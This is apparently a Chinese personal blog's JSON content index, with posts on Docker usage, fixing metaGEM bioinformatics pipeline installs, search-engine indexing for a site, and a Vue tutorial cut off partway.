{"meta":{"title":"小吴の博客","subtitle":"高冷白羊","description":"我的博客","author":"Snowman","url":"https://snowman12137.github.io","root":"/"},"pages":[{"title":"","date":"2023-04-16T12:47:01.000Z","updated":"2024-02-03T17:23:39.226Z","comments":true,"path":"tags/index.html","permalink":"https://snowman12137.github.io/tags/index.html","excerpt":"","text":""},{"title":"","date":"2023-04-16T12:47:12.000Z","updated":"2024-02-03T17:22:50.822Z","comments":true,"path":"categories/index.html","permalink":"https://snowman12137.github.io/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2023-04-16T12:45:28.000Z","updated":"2023-04-16T12:46:28.171Z","comments":true,"path":"about/index.html","permalink":"https://snowman12137.github.io/about/index.html","excerpt":"","text":"关于我这是一个测试"}],"posts":[{"title":"Docker学习(二):docker基本操作","slug":"Docker学习-二-docker基本操作-29260b33a8e64d8a97d968c0e6f26703","date":"2024-02-26T16:00:00.000Z","updated":"2024-02-28T06:12:22.587Z","comments":true,"path":"2024/02/27/Docker学习-二-docker基本操作-29260b33a8e64d8a97d968c0e6f26703/","link":"","permalink":"https://snowman12137.github.io/2024/02/27/Docker%E5%AD%A6%E4%B9%A0-%E4%BA%8C-docker%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C-29260b33a8e64d8a97d968c0e6f26703/","excerpt":"","text":"Docker学习(二):docker基本操作一、容器使用1.获取镜像如果我们本地没有 ubuntu 镜像，我们可以使用 docker pull 命令来载入 ubuntu 镜像： 1docker pull ubuntu 2.启动容器以下命令使用 ubuntu 镜像启动一个容器，参数为以命令行模式进入该容器： 1docker run -it ubuntu /bin/bash 参数说明： i: 交互式操作。 t: 终端。 ubuntu: ubuntu 镜像。 &#x2F;bin&#x2F;bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。 要退出终端，直接输入 exit: 1root@a66766153195:/# exit 3启动已停止运行的容器查看所有的容器命令如下： 1docker ps -a 使用 docker start 启动一个已停止的容器： 1docker start 59d7601fde38 4后台运行在大部分的场景下，我们希望 docker 的服务是在后台运行的，我们可以过 -d 指定容器的运行模式。 1docker run -itd --name ubuntu-test ubuntu /bin/bas 注：加了 -d 参数默认不会进入容器，想要进入容器需要使用指令 docker exec（下面会介绍到）。 5停止一个容器1docker stop &lt;容器 ID&gt; 停止的容器可以通过 docker restart 重启： 1docker restart &lt;容器 ID&gt; 6进入容器在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入： docker attach docker exec：推荐大家使用 docker exec 命令，因为此命令会退出容器终端，但不会导致容器的停止。 7导出和导入容器a导出容器如果要导出本地某个容器，可以使用 docker export 命令。 1docker export 1e560fca3906 &gt; ubuntu.tar 这样将导出容器快照到本地文件。 b导入容器快照可以使用 docker import 从容器快照文件中再导入为镜像，以下实例将快照文件 ubuntu.tar 导入到镜像 test&#x2F;ubuntu:v1: 1cat docker/ubuntu.tar | docker import - test/ubuntu:v1 此外，也可以通过指定 URL 或者某个目录来导入，例如： 1docker import http://example.com/exampleimage.tgz example/imagerepo 8删除容器删除容器使用 docker rm 命令： 1docker rm -f 1e560fca3906 总结镜像，容器命令关系图如下图所示 二、运行一个web应用前面我们运行的容器并没有一些什么特别的用处。 接下来让我们尝试使用 docker 构建一个 web 应用程序。 我们将在docker容器中运行一个 Python Flask 应用来运行一个web应用。 12docker pull training/webappC:\\Users\\xiaow&gt;docker run -d -P training/webapp python app.py 这里多了端口信息。 10.0.0.0:32768-&gt;5000/tcp adoring_hopper Docker 开放了 5000 端口（默认 Python Flask 端口）映射到主机端口 32769 上。 这时我们可以通过浏览器访问WEB应用 1 查看 WEB 应用程序日志查看 WEB 应用程序日志docker logs [ID或者名字] 可以查看容器内部的标准输出。 f: 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出。 从上面，我们可以看到应用程序使用的是 5000 端口并且能够查看到应用程序的访问日志。 2 查看WEB应用程序容器的进程我们还可以使用 docker top 来查看容器内部运行的进程 3.检查 WEB 应用程序使用 docker inspect 来查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息。 三、Docker镜像使用1.列出镜像列表1docker images 各个选项说明: REPOSITORY：表示镜像的仓库源 TAG：镜像的标签 IMAGE ID：镜像ID CREATED：镜像创建时间 SIZE：镜像大小 同一仓库源可以有多个 TAG，代表这个仓库源的不同个版本，如 ubuntu 仓库源里，有 15.10、14.04 等多个不同的版本，我们使用 REPOSITORY:TAG 来定义不同的镜像。 所以，我们如果要使用版本为15.10的ubuntu系统镜像来运行容器时，命令如下： 12C:\\Users\\xiaow&gt;docker run -it ubuntu:15.10 /bin/bashroot@d162c8a4d084:/# 参数说明： i: 交互式操作。 t: 终端。 ubuntu:15.10: 这是指用 ubuntu 15.10 版本镜像为基础来启动容器。 &#x2F;bin&#x2F;bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。 2.获取一个新的镜像当我们在本地主机上使用一个不存在的镜像时 Docker 就会自动下载这个镜像。如果我们想预先下载这个镜像，我们可以使用 docker pull 命令来下载它。 12345678docker pull ubuntu:15.1015.10: Pulling from library/ubuntu7dcf5a444392: Pull complete759aa75f3cee: Pull complete3fa871dc8a2b: Pull complete224c42ae46e7: Pull completeDigest: sha256:02521a2d079595241c6793b2044f02eecf294034f31d6e235ac4b2b54ffc41f3Status: Downloaded newer image for ubuntu:15.10 下载完成后，我们可以直接使用这个镜像来运行容器。 3查找镜像我们可以从 Docker Hub 网站来搜索镜像，Docker Hub 网址为： https://hub.docker.com/ 我们也可以使用 docker search 命令来搜索镜像。比如我们需要一个 httpd 的镜像来作为我们的 web 服务。我们可以通过 docker search 命令搜索 httpd 来寻找适合我们的镜像。 4 拖取镜像我们决定使用上图中的 httpd 官方版本的镜像，使用命令 docker pull 来下载镜像。 123456789101112C:\\Users\\xiaow&gt;docker pull httpdUsing default tag: latestlatest: Pulling from library/httpde1caac4eb9d2: Pull complete87b0fe460fd9: Pull complete4f4fb700ef54: Pull complete9cebd3e3b523: Pull completee9304da947c5: Pull completeb60d4b66b268: Pull completeDigest: sha256:104f07de17ee186c8f37b9f561e04fbfe4cf080d78c6e5f3802fd08fd118c3daStatus: Downloaded newer image for httpd:latestdocker.io/library/httpd:latest 下载完成后，我们就可以使用这个镜像了。 1docker run httpd 5 删除镜像镜像删除使用 docker rmi 命令，比如我们删除 hello-world 镜像： 1docker rmi hello-world 6 创建镜像当我们从 docker 镜像仓库中下载的镜像不能满足我们的需求时，我们可以通过以下两种方式对镜像进行更改。 1、从已经创建的容器中更新镜像，并且提交这个镜像 2、使用 Dockerfile 指令来创建一个新的镜像 a 更新镜像更新镜像之前，我们需要使用镜像来创建一个容器。 12C:\\Users\\xiaow&gt;docker run -it ubuntu:15.10 /bin/bashroot@ff61c4fac64f:/# apt -get update 在运行的容器内使用 apt-get update 命令进行更新。 在完成操作之后，输入 exit 命令来退出这个容器。 此时 ID 为 ff61c4fac64f的容器，是按我们的需求更改的容器。我们可以通过命令 docker commit 来提交容器副本。 12C:\\Users\\xiaow&gt;docker commit -m=&quot;has update&quot; -a=&quot;Sn0wm1an&quot; ff61c4fac64f Sn0wm1an/ubuntu:v2 sha256:ae1d6cfe0a7c2fde9d8a490435ebc947821288c877faade9a5e7d403d08bd352 各个参数说明： m: 提交的描述信息 a: 指定镜像作者 e218edb10161：容器 ID runoob&#x2F;ubuntu:v2: 指定要创建的目标镜像名 我们可以使用 docker images 命令来查看我们的新镜像 Sn0wm1an**&#x2F;ubuntu:v2**： 使用我们的新镜像 Sn0wm1an**&#x2F;ubuntu** 来启动一个容器 四、进阶使用方法1.Docker 容器连接前面我们实现了通过网络端口来访问运行在 docker 容器内的服务。 容器中可以运行一些网络应用，要让外部也可以访问这些应用，可以通过 -P 或 -p 参数来指定端口映射。 下面我们来实现通过端口连接到一个 docker 容器。 a.端口映射我们创建了一个 python 应用的容器。 1docker run -d -P training/webapp python app.py 另外，我们可以指定容器绑定的网络地址，比如绑定 127.0.0.1。 我们使用 -P 绑定端口号，使用 docker ps 可以看到容器端口 5000 绑定主机端口 32768。 我们也可以使用 -p 标识来指定容器端口绑定到主机端口。 两种方式的区别是: P :是容器内部端口随机映射到主机的端口。 p : 是容器内部端口绑定到指定的主机端口。 1docker run -d -p 5000:5000 training/webapp python app.py bDocker 容器互联端口映射并不是唯一把 docker 连接到另一个容器的方法。 docker 有一个连接系统允许将多个容器连接在一起，共享连接信息。 docker 连接会创建一个父子关系，其中父容器可以看到子容器的信息。 容器命名 当我们创建一个容器的时候，docker 会自动对它进行命名。另外，我们也可以使用 –name 标识来命名容器，例如： 1docker run -d -P --name Sn0wm1an training/webapp python app.py 新建网络 下面先创建一个新的 Docker 网络。 1docker network create -d bridge test-net 参数说明： d：参数指定 Docker 网络类型，有 bridge、overlay。 其中 overlay 网络类型用于 Swarm mode，在本小节中你可以忽略它。 连接容器 运行一个容器并连接到新建的 test-net 网络: 1docker run -itd --name test1 --network test-net ubuntu /bin/bash 打开新的终端，再运行一个容器并加入到 test-net 网络: 1$ docker run -itd --name test2 --network test-net ubuntu /bin/bash c 配置 DNS我们可以在宿主机的 &#x2F;etc&#x2F;docker&#x2F;daemon.json 文件中增加以下内容来设置全部容器的 DNS： 123456&#123; &quot;dns&quot; : [ &quot;114.114.114.114&quot;, &quot;8.8.8.8&quot; ]&#125; 设置后，启动容器的 DNS 会自动配置为 114.114.114.114 和 8.8.8.8。 配置完，需要重启 docker 才能生效。 查看容器的 DNS 是否生效可以使用以下命令，它会输出容器的 DNS 信息：","categories":[{"name":"docker","slug":"docker","permalink":"https://snowman12137.github.io/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://snowman12137.github.io/tags/docker/"}],"author":"Sn0wma1n"},{"title":"Docker学习(一):安装docker（win）","slug":"Docker学习-一-安装docker（win）-842d24f88e8940f28160a957ffea2fc8","date":"2024-02-25T16:00:00.000Z","updated":"2024-02-28T06:09:32.443Z","comments":true,"path":"2024/02/26/Docker学习-一-安装docker（win）-842d24f88e8940f28160a957ffea2fc8/","link":"","permalink":"https://snowman12137.github.io/2024/02/26/Docker%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%AE%89%E8%A3%85docker%EF%BC%88win%EF%BC%89-842d24f88e8940f28160a957ffea2fc8/","excerpt":"","text":"Docker学习(一):安装docker（win）教程来自菜鸟 一、前言因为项目的代码必须要在Linux才能运行，为了跨平台的性能考虑，因此我打算使用win+docker的形式来运行后端，开始学习。 二、Windows Docker 安装Docker 并非是一个通用的容器工具，它依赖于已存在并运行的 Linux 内核环境。 Docker 实质上是在已经运行的 Linux 下制造了一个隔离的文件环境，因此它执行的效率几乎等同于所部署的 Linux 主机。 因此，Docker 必须部署在 Linux 内核的系统上。如果其他系统想部署 Docker 就必须安装一个虚拟 Linux 环境。 在 Windows 上部署 Docker 的方法都是先安装一个虚拟机，并在安装 Linux 系统的的虚拟机中运行 Docker。 Win10 系统 Docker Desktop 是 Docker 在 Windows 10 和 macOS 操作系统上的官方安装方式，这个方法依然属于先在虚拟机中安装 Linux 然后再安装 Docker 的方法。 Docker Desktop 官方下载地址 安装 Hyper-VHyper-V 是微软开发的虚拟机，类似于 VMWare 或 VirtualBox，仅适用于 Windows 10。这是 Docker Desktop for Windows 所使用的虚拟机。 但是，这个虚拟机一旦启用，QEMU、VirtualBox 或 VMWare Workstation 15 及以下版本将无法使用！如果你必须在电脑上使用其他虚拟机（例如开发 Android 应用必须使用的模拟器），请不要使用 Hyper-V！ 开启 Hyper-V 1Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All 安装 Docker Desktop for Windows点击 Get started with Docker Desktop，并下载 Windows 的版本，如果你还没有登录，会要求注册登录： 运行安装文件双击下载的 Docker for Windows Installer 安装文件，一路 Next，点击 Finish 完成安装。 安装完成后，Docker 会自动启动。通知栏上会出现个小鲸鱼的图标，这表示 Docker 正在运行。 安装之后，可以打开 PowerShell 并运行以下命令检测是否运行成功： 1docker run hello-world 二、镜像加速&#x2F;更改下载文件位置点击设置 镜像加速点击Docker Engine然后加入 123456&quot;registry-mirrors&quot;: [ &quot;https://docker.mirrors.ustc.edu.cn&quot;, &quot;https://registry.docker-cn.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://mirror.ccs.tencentyun.com&quot;] 再点击Apply即可 更改下载文件位置","categories":[{"name":"docker","slug":"docker","permalink":"https://snowman12137.github.io/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://snowman12137.github.io/tags/docker/"}],"author":"Sn0wma1n"},{"title":"metaGEM使用小记(解决各种问题)2024.2(三)","slug":"metaGEM使用小记-解决各种问题-2024-2（三）","date":"2024-02-13T16:00:00.000Z","updated":"2024-02-17T15:47:26.549Z","comments":true,"path":"2024/02/14/metaGEM使用小记-解决各种问题-2024-2（三）/","link":"","permalink":"https://snowman12137.github.io/2024/02/14/metaGEM%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0-%E8%A7%A3%E5%86%B3%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98-2024-2%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"","text":"metaGEM使用小记(解决各种问题)2024.2（三）正式流程这是原始文件夹省略了这些文件的内容，tree -I &#39;scripts|rules|envs&#39; 12345678910111213.├── config.yaml├── dataset│ ├── L1EFG190305--AM43│ │ ├── L1EFG190305--AM43_R1.fastq.gz│ │ └── L1EFG190305--AM43_R2.fastq.gz│ └── L1EFG190306--AM51│ ├── L1EFG190306--AM51_R1.fastq.gz│ └── L1EFG190306--AM51_R2.fastq.gz├── logs├── metaGEM.sh├── Snakefile├── temp 1.使用fastp质量过滤reads每个样本提交一个质量过滤工作，每个过滤工作有2个CPU和20GB 内存，最大运行时间为2小时 123bash metaGEM.sh -t fastp -j 2 -c 2 -m 20 -h 2 #运行主要程序(不要忘了source)#可视化质量筛选结果：bash metaGEM.sh -t qfilterVis 2.用 Megahit 组装每个样品提交一个组装作业，每个组装作业有24个CPU和120GB 内存，最大运行时间为24小时: 123bash metaGEM.sh -t megahit -j 2 -c 24 -m 120 -h 24#可视化组装结果bash metaGEM.sh -t assemblyVis 3. 使用 CONCOCT、 MaxBin2和 MetaBAT2分箱使用 bwa 和 samtools，将每组成对的末端读数与每组组装的组合进行交叉映射，以获得样品间组合的丰度&#x2F;覆盖率。每个样本提交一个作业，每个作业有24个CPU和120GB 内存，最大运行时间为24小时: 1bash metaGEM.sh -t crossMapSeries -j 2 -c 24 -m 120 -h 24 注意这里如果报错找不到XXX.py是没有安装CONCOCT需要手动安装（好像后面还缺了什么文件先不管它） 1234wget https://github.com/BinPro/CONCOCT/archive/refs/tags/1.1.0.tar.gztar -zxvf 1.1.0.tar.gzcd 1.1.0.tar.gzpython setup.py install 如果安装时 报错gsl&#x2F;gsl_vector.h: No such file or directory 移步这里 或者快捷解决conda install anaconda::gsl 后面还让我装了pandas和pyarrow(奇怪) 1conda install anaconda::pandas anaconda::pyarrow -y 注意: 旧的 rule CrosMap 被分成了 CrosMapSeries 和 rosMapParaller 两部分。运行序列映射更加简单，但是从计算资源的角度来看，对于有大量样本的数据集，例如 N &#x3D; 1000，运行映射的代价可能会高得令人望而却步。在样本之间运行每个binners，使用连续覆盖率: 123bash metaGEM.sh -t concoct -j 2 -c 24 -m 80 -h 10bash metaGEM.sh -t metabat -j 2 -c 24 -m 80 -h 10bash metaGEM.sh -t maxbin -j 2 -c 24 -m 80 -h 10 4.使用metWRAP改进和重新组装优化和重组bins 1bash metaGEM.sh -t binRefine -j 2 -c 24 -m 150 -h 24 报错1(concoct)：TypeError: Feature names are only supported if all input features have string names, but your input has [‘int’, ‘str’] as feature name &#x2F; column name types. If you want feature names to be stored and validated, you must convert them all to strings, by using X.columns &#x3D; X.columns.astype(str) for example. Otherwise you can remove feature &#x2F; column names from your input data, or convert them all to a non-string data type. 根据报错找到关键语句 1concoct --coverage_file $(basename /home/gc/metaGEM/workflow/concoct/L1EFG190305--AM43/cov/coverage_table.tsv) --composition_file assembly_c10k.fa -b $(basename $(dirname /home/gc/metaGEM/workflow/concoct/L1EFG190305--AM43/L1EFG190305--AM43.concoct-bins)) -t 48 -c 800 找到了相关解决方案 找到/envs/metagem/lib/python3.10/site-packages/sklearn/utils/validation.py 文件 修改语句 1feature_names = np.asarray(X.columns, dtype=object) 把这个语句注释掉然后添加 1feature_names = np.asarray(X.columns.astype(str), dtype=object) 报错2(maxbin2)：&#x2F;usr&#x2F;bin&#x2F;bash: line 28: run_MaxBin.pl: command not found 原因没有安装maxbin 下载 https://sourceforge.net/projects/maxbin/files/ 1234567wget https://sourceforge.net/projects/maxbin/files/MaxBin-2.2.7.tar.gztar -zxvf MaxBin-2.2.7.tar.gzcd MaxBin-2.2.7/srcmakecd ..apt-get install autoconf./autobuild_auxiliary 在最后一步报错Cannot unzip bowtie2 zip file. Please make sure that [unzip] works properly. 原因：安装源下载网速过慢导致无法运行 修正方法：找到.&#x2F;MaxBin-2.2.7&#x2F;buildapp文件，找到这一行 1$cmd = &quot;curl -L $URLBASE/$bowtie_f -k 1&gt;$bowtie_f &quot;; 注释掉并改成一下内容，注意后面有分号不要忘了 12#$cmd = &quot;curl -L $URLBASE/$bowtie_f -k 1&gt;$bowtie_f &quot;;$cmd = &quot;wget https://sourceforge.net/projects/bowtie-bio/files/bowtie2/2.2.3/bowtie2-2.2.3-source.zip&quot; 不要忘了把新生成的文件夹加入环境变量 1export PATH=&quot;/home/gc/MaxBin-2.2.7:$PATH&quot; 在输入下列语句之前一定要先进入到metawrap 环境然后配置下面的功能 123conda activate envs/metawrap checkm_db=&quot;/home/ubuntu/checkm/&quot;echo $&#123;checkm_db&#125; | checkm data setRoot $&#123;checkm_db&#125; 如果不配置好会得到以下报错 12It seems that the CheckM data folder has not been set yet or has been removed. Running: &#x27;checkm data setRoot&#x27;.Where should CheckM store it&#x27;s data? 然后输入运行程序 1bash metaGEM.sh -t binReassemble -j 2 -c 24 -m 150 -h 24 报错IOError: [Errno 2] No such file or directory: u’&#x2F;home&#x2F;gc&#x2F;checkm&#x2F;hmms&#x2F;phylo.hmm’或者It seems that the CheckM data folder has not been set yet or has been removed. Running: ‘checkm data setRoot’.Where should CheckM store it’s data? 1234567#先下载缺失的文件cd ~wget https://data.ace.uq.edu.au/public/CheckM_databases/checkm_data_2015_01_16.tar.gzmkdir checkmtar -zxvf checkm_data_2015_01_16.tar.gz -C ./checkmcheckm_db=&quot;/home/gc/checkm/&quot;echo $&#123;checkm_db&#125; | checkm data setRoot $&#123;checkm_db&#125; 终于在本地调试中发现了报错 解决 123找到这个文件的这一行File &quot;/home/gc/metaGEM/workflow/envs/metawrap/share/spades-3.13.0-0/share/spades/pyyaml3/constructor.py&quot;, line 126, in construct_mapping找到代码 if not isinstance(key, collections.Hashable):改成这样 if not isinstance(key, collections.abc.Hashable) 可视化输出 1bash metaGEM.sh -t binningVis 报错*/*reassembled_bins/*.fa: No such file or directory看reassembled_bins文件夹里面确实没有fa结尾的文件，这个嘶~，报错无从查起。那就再跑一遍bash metaGEM.sh -t binReassemble -j 2 -c 24 -m 150 -h 24这个命令吧。 可以看到在生成的中间文件中是有.fa结尾的文件的，而且还不少，因此我们监控一下在处理时发生了什么。 因为上次运行的时候有中断行为，因此重新运行一遍就好了 5用 GTDB-tk 进行分类首先让我们从 metWRAP 重组输出中提取我们的 DNA bins: 1bash metaGEM.sh -t extractDnaBins 运行 GTDB-tk 进行分类学分类: 1bash metaGEM.sh -t gtdbtk -j 2 -c 24 -m 80 -h 12 在计算相对丰度之后，我们将可视化分类注释。 报错，没有数据库12345678910conda uninstall gtdbtkconda install -c conda-forge -c bioconda gtdbtk -ydownload-db.sh#检验是否安装成功gtdbtk check_install#如果报错The GTDB-Tk reference data does not exist or is corrupted#则在Snakefile的1204行添加如下内容，并去掉注释#安装的数据库在以下路径gc为你电脑的名字/home/gc/metaGEM/workflow/envs/metagem/share/gtdbtk-1.7.0/dbexport GTDBTK_DATA_PATH=/home/gc/metaGEM/workflow/envs/metagem/share/gtdbtk-1.7.0/db 报错prodigal is not on the system path.安装prodigal 12345wget https://github.com/hyattpd/Prodigal/releases/download/v2.6.3/prodigal.linuxwget https://github.com/hyattpd/Prodigal/archive/v2.6.3.tar.gztar -zxvf v2.6.3.tar.gzcd Prodigal-2.6.3sudo make install 报错hmmalign is not on the system path.后面还有一些没有安装一块安装了 12345sudo apt install hmmerconda install -c bioconda pplacer#如果依赖报错则更改下列语句#conda install python=3.6 #安装fastANI需要python3.6这里降一下版本conda install -c conda-forge -c bioconda r-base=4 fastani 报错fastANI: error while loading shared libraries: libgsl.so.25 经过研究发现fastANI如果通过conda安装的话会报很多环境依赖的问题，因为在先前使用的是python3.10，网上有人说用python3.6才可以安装，于是我退回3.6发现依旧是有依赖问题无法安装，于是我寻求了手动编译安装的方法，如果有人conda install -c bioconda fastani 使用了上述语句成功安装，则不需要经过以下途径安装。 安装fastANI需要gsl依赖，在后面的安装中又出现了zlib库缺失的情况，我在这里就一块安装了 fastANI教程来自 奇怪的是.so.25按道理来说应该用2.5版本的，但是2.5版本编译以后出来的是.so.23，下面有一个测试脚本,并无法运行，猜测应该是要用.so.25的文件，于是我又安装了gsl2.7，安装后出现了.so.25文件，并且编译没有出现问题(怪) 先安装gsl和zlib再安装fastani 123456789101112131415161718192021222324252627282930313233343536#安装gslwget https://ftp.gnu.org/gnu/gsl/gsl-2.7.tar.gztar -zxvf gsl-2.7.tar.gzcd gsl-2.7./configuremakesudo make installvim /home/username/.bashrch#在末尾添加export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/libexport CFLAGS=&quot;-I/usr/local/include&quot;export LDFLAGS=&quot;-L/usr/local/lib&quot;#(验证)gsl是否安装成功使用后面的测试脚本#安装zlibwget https://www.zlib.net/zlib-1.3.1.tar.gztar -zxvf zlib-1.3.1.tar.gz cd zlib-1.3.1./configuremakemake checksudo make install#zlib的验证 zlib提供了测试样例，在examples里面cd zlib-1.3.1/examplesgcc -c enough.cgcc enough.o./a.out #成功运行截图在后面#安装fastaniwget https://github.com/ParBLiSS/FastANI/archive/master.zipunzip master.zipcd FastANI-master/autoconf./configure #--with-gsl=/usr/ 因为我们已经把gsl加入到环境变量里去了，所以这里我们把后面的语句注释掉make#验证fastani是否安装成功fastANI#返回Provide reference file (s) 测试脚本 123456789101112//test.c#include &lt;stdio.h&gt;#include &lt;gsl/gsl_sf_bessel.h&gt; intmain (void)&#123; double x = 5.0; double y = gsl_sf_bessel_J0 (x); printf (&quot;J0(%g) = %.18e/n&quot;, x, y); return 0;&#125; 123gcc -c test.cgcc test.o -lgsl -lgslcblas -lm./a.out zlib的验证 6 bwa 和 samtools 计算相对丰度1bash metaGEM.sh -t abundance -j 2 -c 24 -m 80 -h 12 可视化分类和相对丰富度: 1bash metaGEM.sh -t compositionVis 报错Error in library(tidytext) : there is no package called ‘tidytext’发现这个tidytext是一个R包，安装R包环境 先安装R包环境 1234567wget https://cran.r-project.org/src/base/R-4/R-4.3.2.tar.gztar -zxvf R-4.3.2.tar.gzcd R-4.3.2#! 编译，指定安装目录./configure --prefix=&#x27;/home/gc/R/R-4.2.2/&#x27; --enable-R-shlib=yes --with-readline=yes --with-libpng=yes --with-x=yes --with-blas --with-tcltk --with-pcrel#! 安装make&amp;&amp;make install 在安装其中的依赖 123R#进入R环境然后输入下列语句install.packages(c(&quot;mnormt&quot;, &quot;psych&quot;, &quot;SnowballC&quot;, &quot;hunspell&quot;, &quot;broom&quot;, &quot;tokenizers&quot;, &quot;janeaustenr&quot;))install.packages(&quot;tidytext&quot;) 以下是文件树 1tree -I &#x27;env|.snakemake|temp&#x27; &gt; file-tree.txt","categories":[{"name":"MAGs云分析","slug":"MAGs云分析","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/"},{"name":"生物计算机科学","slug":"MAGs云分析/生物计算机科学","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/%E7%94%9F%E7%89%A9%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"}],"tags":[{"name":"metaGEM","slug":"metaGEM","permalink":"https://snowman12137.github.io/tags/metaGEM/"}],"author":"Sn0wma1n"},{"title":"如何让自己的网站被搜索到","slug":"如何让自己的网站被搜索到","date":"2024-02-04T16:00:00.000Z","updated":"2024-03-02T09:52:12.600Z","comments":true,"path":"2024/02/05/如何让自己的网站被搜索到/","link":"","permalink":"https://snowman12137.github.io/2024/02/05/%E5%A6%82%E4%BD%95%E8%AE%A9%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E7%AB%99%E8%A2%AB%E6%90%9C%E7%B4%A2%E5%88%B0/","excerpt":"","text":"如何让自己的网站被搜索到在有了个人网站以后，总希望更多的人来踩一踩看一看。也希望自己写的博客能够真的分享被别人搜索到，达到博客应有的分享功能。但是了解以后才发现：网站能够被搜索引擎搜索到需要自己的网站被搜索引擎收录。一般来说，能被搜索引擎所收录有三种途径： 交钱：一次点击 $0.05 USD， 适用于商业推广，并会现实在右栏（广告栏）。 网站本身知名度高，影响力高：Google 对搜索结果的排名目前使用page rank算法，简单来说越多影响力大的知名网站能够导向你的网站，你的网站的得分就越高，就会排在前面。如果你的网站的影响力已经很大，搜索引擎会主动去添加索引。 申请：自己主动向搜索引擎添加自己的链接，请求搜索引擎使用爬虫检索你的网站。 步骤 查看网站是否被Google收录 （应该没有） 提交URL并验证所有权 添加Sitemaps给爬虫加个速 手动请求（重新索引） 百度搜索添加 1.查看网站是否被google收录查看网站是否被 Google 收录很简单：打开Google搜索，在搜索框内输入 1site:your-websit-url&gt; 如果没有被收录进行以下操作，不用多久就会被搜索到了 2.提交URL并验证所有权可能你已经观察到了，无论有没有被Google收录，Google都会在第一条显示Google Search Console。个人猜测，这是出于安全与隐私方面的考虑。Google把是否允许收录网站的权利交给真正的站主。 a.点击添加资源 b.点击右边添加网址前缀 c. 建议选择HTML文件验证方法一共有5种验证方法： HTML 文件：通过在网址根目录添加一个随机生成的.html文件验证。优点：不需要改动原有代码。 HTML 标记：通过向首页添加元标记，将元标记复制到第一个&lt;head&gt;中验证。缺点：需要改动原有index.html Google Analytics：注册Google Analytics账号后将analytics.js或gtag.js代码段添加到&lt;head&gt;中。缺点：麻烦，并需要改动原有代码。优点：可以有新的feature。 Google Tag Manager：同上。 DNS 设置：将TXT记录复制到DNS配置中。缺点：麻烦，响应慢（最长1天），有的服务商很难找到DNS配置入口。 以下操作HTML文件验证在后文操作 3.添加Sitemaps给爬虫加个速Sitemaps是什么？站点地图(Site Map)是用来注明网站结构的文件，可以让搜索引擎的爬虫了解你的网站结构，以便于高效爬取内容，快速建立索引。Google 等搜索引擎会读取此文件，以便更加智能地抓取你的网站。站点地图会告诉 Google 你认为网站中的哪些网页和文件比较重要，还会提供与这些文件有关的重要信息：以网页为例，这些信息包括网页上次更新的时间、网页更改的频率，以及网页是否有其他语言版本。 如果你的网站上的网页链接得当，那么 Google 通常能够发现其中的大多数网页。即便如此，站点地图仍有助于我们更加高效地抓取规模更大、更复杂的网站或更特殊的文件。 在以下情况下，可能需要站点地图： 网站规模很大。 网站有大量内容页归档，这些内容页之间互不关联或缺少有效链接。 网站为新网站且指向该网站的外部链接不多。 网站包含大量富媒体内容（视频、图片）或显示在 Google 新闻中。 在以下情况下，可能不需要站点地图： 网站规模“较小”。规模较小是指网站上的网页数不超过 500 个。 使用了简单网站托管服务，例如 Blogger 或 Wix。 网站已在内部全面建立链接。这意味着，Google 可以沿着首页的链接找到网站上的所有重要网页。 在索引中需要出现的媒体文件（视频、图片）或新闻页面不多。 通过XML-Sitemaps.com生成 a.点击进入XML-Sitemaps.com，输入个人网站地址，点击start。 b.等待搜索完成 预览一下 c.下载sitemap.xml文件并上传到网站根目录下 d.在Google Search Console提交站点地图 4.手动请求检查我这里检查后看到并没有收录，点击请求编入索引 等待一两分钟后，抓取成功 刚提交还没有刷新出来，等一段时间看看 5.百度打开百度搜索资源平台 下载验证文件，把下载的文件添加到suorce文件夹中，每一次提交时会刷新source的内容 但是这是这个HTML文件，我们的主题会自动把它给渲染导致验证失败，我们只需要找到主题的配置文件搜索skip，会有跳过渲染的选项，把文件添加到里面即可(注意一定要hexo clean 才会更新配置文件) 然后点击验证就成功辣，过一段时间后你可以通过谷歌收录网站或者搜索框输入site:xxx.com 来查看收录情况和流量情况 晚上突然想起来搜索了一下，可以被搜索到了","categories":[{"name":"其他","slug":"其他","permalink":"https://snowman12137.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"博客问题","slug":"博客问题","permalink":"https://snowman12137.github.io/tags/%E5%8D%9A%E5%AE%A2%E9%97%AE%E9%A2%98/"}],"author":"Sn0wma1n"},{"title":"VUE学习(二)","slug":"VUE学习-二-dc56c04481d44b9f9da3d52db4606175","date":"2024-02-03T16:00:00.000Z","updated":"2024-02-06T18:23:46.892Z","comments":true,"path":"2024/02/04/VUE学习-二-dc56c04481d44b9f9da3d52db4606175/","link":"","permalink":"https://snowman12137.github.io/2024/02/04/VUE%E5%AD%A6%E4%B9%A0-%E4%BA%8C-dc56c04481d44b9f9da3d52db4606175/","excerpt":"","text":"VUE学习(二)1.快速上手安装 1npm create vue@latest 用最朴素的配置 123456789101112✔ Project name: … &lt;your-project-name&gt;✔ Add TypeScript? … No / Yes✔ Add JSX Support? … No / Yes✔ Add Vue Router for Single Page Application development? … No / Yes✔ Add Pinia for state management? … No / Yes✔ Add Vitest for Unit testing? … No / Yes✔ Add an End-to-End Testing Solution? … No / Cypress / Playwright✔ Add ESLint for 